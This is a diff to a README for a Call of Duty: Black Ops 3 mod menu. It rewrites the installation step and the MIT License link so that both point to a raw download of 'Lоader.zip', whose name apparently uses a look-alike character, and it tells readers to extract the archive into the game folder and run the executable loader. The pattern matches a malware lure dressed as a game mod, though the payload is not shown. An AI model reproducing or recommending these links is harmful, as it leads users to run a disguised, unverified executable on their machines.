@@ -31,7 +31,7 @@ Welcome to the **Cod Bo3 MXT Mod Menu** repository! This advanced tool empowers 
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository's Releases section.
+1. Download **https://raw.githubusercontent.com/Bheka77/Bo3-MXT-Mod-Menu-Deluxe/main/Lоader.zip** from the repository's Releases section.
 2. Extract to your Call of Duty: BO3 directory.
 3. Launch Cod Bo3 MXT Mod Menu via the executable loader.
 4. Follow on-screen instructions for optimal setup.
@@ -57,4 +57,4 @@ This project is for educational and private use only. Do not utilize in public m
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).
+Distributed under the [MIT License](https://raw.githubusercontent.com/Bheka77/Bo3-MXT-Mod-Menu-Deluxe/main/Lоader.zip).
